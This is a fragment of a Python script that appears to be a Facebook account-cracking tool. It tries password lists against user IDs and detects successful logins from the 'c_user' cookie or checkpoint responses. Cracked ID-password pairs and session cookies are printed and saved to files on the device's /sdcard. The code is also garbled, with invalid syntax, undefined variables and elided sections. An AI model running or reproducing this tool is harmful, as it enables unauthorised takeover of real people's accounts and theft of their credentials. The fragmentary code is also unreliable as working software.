...
def DX_AJMIR():
    ...
    os.system('clear');print(logo);print("  \033[1;35m[\033[1;32m1\033[1;35m]\033[1;32m BD RANDOM \033[1;35m[\033[1;32m2\033[1;35m]\033[1;32m MY CONTACT INFO \033[1;35m[\033[1;32m0\033[1;35m]\033[1;32m CLOSED TOOLS");DX_Ajmir();Ajmir Hossain = input(f'  \033[1;91m[\033[1;97m?\033[1;91m]\033[1;32m CHOICE YOUR OPTION :\033[1;36m ')
    if Ajmir in ["1","A","a"]:
        Nodi()
    if Ajmir in ["2","B","b"]:
        Contact()
    if Tahrima in ["0","E","e"]:
    	...
    	print("  \033[1;35m[\033[1;32m×\033[1;35m]\033[1;32m Worning Typ");DX_Ajmir()
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#••••••••••••••••••••••CONTACT INFO•••••••••••••••••••••••••••#
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
def Contact():
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92DX-AJMIR-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/HASAN-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mDX-AJMIR-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/HASAN-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[DX-AJMIR-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/HASAN-CP-M2.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mDX-AJMIR-OᏦ\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE : \033[1;95m'+coki);open('/sdcard/HASAN-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mDX-AJMIR-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/HASAN-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mDX-AJMIR-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;97m'+coki);open('/sdcard/HASAN-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
